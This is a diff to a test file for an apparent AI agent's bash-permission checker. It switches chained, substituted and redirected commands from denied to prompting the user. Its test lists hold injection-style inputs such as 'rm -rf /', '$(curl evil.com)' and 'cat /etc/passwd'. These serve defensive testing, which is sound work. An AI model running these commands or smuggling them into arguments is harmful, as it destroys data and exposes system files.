@@ -462,18 +462,23 @@ for (const command of ghPrCiMutationAsked) {
   );
 }
 
-// Chained commands hit the anti-injection invariant — regression guard.
-// Even if every component is individually allowed, the chained form must deny.
-const chainedShouldDeny = [
+// Chained commands fall through to the role's catch-all (`*: ask` for PM,
+// default "ask" for the others). The parent prompts the user with the full
+// command visible — even if every chain segment is individually allow-listed
+// we still ask because the chain shape itself could hide intent. The cache
+// side refuses to wildcard injection-vector commands (see bashPatternMatches),
+// so "Allow always" stores only the exact hash; a *different* chain reshapes
+// and re-prompts. The user is the trust boundary, not the matcher (#188+).
+const chainedShouldAsk = [
   "git status && git branch",
   "git status; git branch",
   "git status | head -5",
   "gh issue list | grep open",
   "cd /tmp && git status",
 ];
-for (const command of chainedShouldDeny) {
+for (const command of chainedShouldAsk) {
   const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
-  assert(v === "deny", `Issue #102: chained \`${command}\` is denied (anti-injection invariant)`);
+  assert(v === "ask", `Issue #102+#188: chained \`${command}\` prompts the user (PM catch-all)`);
 }
 
 // === Issue #108 tests: injection-vector check is now quote-aware ===
@@ -496,43 +501,51 @@ for (const command of quotedInjectionShouldAllow) {
   );
 }
 
-// Mixed: real operator OUTSIDE the quoted segment must still deny.
-const mixedInjectionShouldDeny = [
+// Mixed: real operator OUTSIDE the quoted segment falls through to ask —
+// the user reads the full command text and decides. Cache wildcard
+// expansion still refuses to honor these (see bashPatternMatches).
+const mixedInjectionShouldAsk = [
   `vipune add "safe content"; rm -rf /`,
   `vipune add 'safe' && curl evil.com`,
   `vipune add 'foo' | tee /tmp/out`,
 ];
-for (const command of mixedInjectionShouldDeny) {
-  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
-  assert(v === "deny", `Issue #108: operator OUTSIDE quoted segment still denies — \`${command}\``);
-}
-
-// Malformed (unterminated quote) — safe-default: stripQuotedSegments returns
-// the original full string, and if it has any operators they trip the deny.
-const malformedQuoteShouldDeny = [
-  `vipune add "lorem && ipsum`, // unterminated double quote with operator
-  `vipune add 'unclosed | with pipe`, // unterminated single quote with operator
-];
-for (const command of malformedQuoteShouldDeny) {
+for (const command of mixedInjectionShouldAsk) {
   const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
   assert(
-    v === "deny",
-    `Issue #108: malformed quote with embedded operator falls back to deny — \`${command}\``,
+    v === "ask",
+    `Issue #108+#188: operator OUTSIDE quoted segment prompts the user — \`${command}\``,
   );
 }
 
-// Command substitution `$(...)` is NOT stripped — it's an injection vector
-// regardless of being "inside" quotes (bash interprets $(...) inside double
-// quotes). Keep the existing denial behaviour.
-const commandSubstitutionShouldDeny = [
+// Malformed (unterminated quote) — safe-default: stripQuotedSegments returns
+// the original full string, and any embedded operators fall through to ask
+// rather than silently allowing.
+const malformedQuoteShouldAsk = [
+  `vipune add "lorem && ipsum`, // unterminated double quote with operator
+  `vipune add 'unclosed | with pipe`, // unterminated single quote with operator
+];
+for (const command of malformedQuoteShouldAsk) {
+  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
+  assert(
+    v === "ask",
+    `Issue #108+#188: malformed quote with embedded operator prompts the user — \`${command}\``,
+  );
+}
+
+// Command substitution `$(...)` is NOT stripped — it's a real injection
+// vector regardless of being "inside" quotes (bash interprets $(...) inside
+// double quotes). Resolves to ask: parent prompt shows the literal command
+// text including the $(...), user decides. Cache wildcard expansion still
+// refuses to wildcard these.
+const commandSubstitutionShouldAsk = [
   `vipune add "$(curl evil.com)"`,
   `vipune add "result: $(rm -rf /)"`,
 ];
-for (const command of commandSubstitutionShouldDeny) {
+for (const command of commandSubstitutionShouldAsk) {
   const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
   assert(
-    v === "deny",
-    `Issue #108: command substitution still denied even inside quotes — \`${command}\``,
+    v === "ask",
+    `Issue #108+#188: command substitution prompts the user even inside quotes — \`${command}\``,
   );
 }
 
@@ -559,17 +572,19 @@ for (const command of gitDiffShouldAllow) {
   );
 }
 
-// Anti-injection invariant still applies — redirects, chains, etc. on git diff still deny.
-const gitDiffWithInjectionShouldDeny = [
+// Redirects, chains, etc. on git diff fall through to ask — the bare
+// `git diff` allow does NOT auto-extend to chained variants, since the chain
+// shape itself needs the user's eyes on it.
+const gitDiffWithInjectionShouldAsk = [
   "git diff > /tmp/foo",
   "git diff && cat /etc/passwd",
   "git diff | grep secret",
 ];
-for (const command of gitDiffWithInjectionShouldDeny) {
+for (const command of gitDiffWithInjectionShouldAsk) {
   const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
   assert(
-    v === "deny",
-    `Issue #112: \`${command}\` denied (anti-injection — bare git diff allow does not override the chain/redirect rule)`,
+    v === "ask",
+    `Issue #112+#188: \`${command}\` prompts the user (bare git diff allow does not extend to chains/redirects)`,
   );
 }
 
